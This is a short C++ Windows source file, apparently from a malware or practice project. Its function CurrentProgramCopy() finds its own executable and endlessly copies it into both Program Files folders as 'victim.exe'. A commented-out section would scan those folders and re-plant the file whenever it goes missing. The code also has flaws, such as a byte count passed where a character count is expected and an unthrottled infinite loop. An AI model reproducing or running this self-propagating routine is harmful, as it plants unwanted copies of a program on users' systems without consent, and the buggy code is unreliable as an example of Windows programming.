#include"main.h"


void CurrentProgramCopy() 
{

	HANDLE hfind1 = NULL;
	HANDLE hfind2 = NULL;
	WIN32_FIND_DATA fd1 = { 0, };
	WIN32_FIND_DATA fd2 = { 0, };
	

	CString victim = { L"victim.exe" };
	CString program_file_86{ L"c:\\program files (x86)\\*" };
	CString program_file{ L"c:\\program files" };



	TCHAR path[MAX_PATH] = { 0, };

	HANDLE hfile = NULL;
	GetModuleFileName(NULL, path, sizeof(path));

	/*hfind1 = FindFirstFile(program_file_86.GetBuffer(), &fd1);
	if (hfind1 == INVALID_HANDLE_VALUE)
		return;
	hfind2 = FindFirstFile(program_file.GetBuffer(), &fd2);
	if (hfind2 == INVALID_HANDLE_VALUE);*/

	


	Sleep(100);


	while(1){
		CopyFile(path, L"c:\\program files (x86)\\victim.exe", true);
		CopyFile(path, L"c:\\program files\\victim.exe", true);

		//wcout << fd.cFileName << endl;
		/*if (!victim.CompareNoCase(fd1.cFileName))
		{
			FindClose(hfind1);
			hfind1 = FindFirstFile(program_file_86.GetBuffer, &fd1);

		}

		if (!victim.CompareNoCase(fd2.cFileName)) 
		{
			
			FindClose(hfind2);
			hfind2 = FindFirstFile(program_file.GetBuffer, &fd2);

		}
		FindNextFile(hfind1, &fd1);
		if (GetLastError() == ERROR_NO_MORE_FILES)
		{
			GetModuleFileName(NULL, path, sizeof(path));
			CopyFile(path, L"c:\\program files (x86)\\victim.exe", true);
		}
		FindNextFile(hfind2, &fd2);
		if (GetLastError() == ERROR_NO_MORE_FILES) 
		{
			GetModuleFileName(NULL, path, sizeof(path));
			CopyFile(path, L"c:\\program files\\victim.exe", true);

		}*/
		
	}



}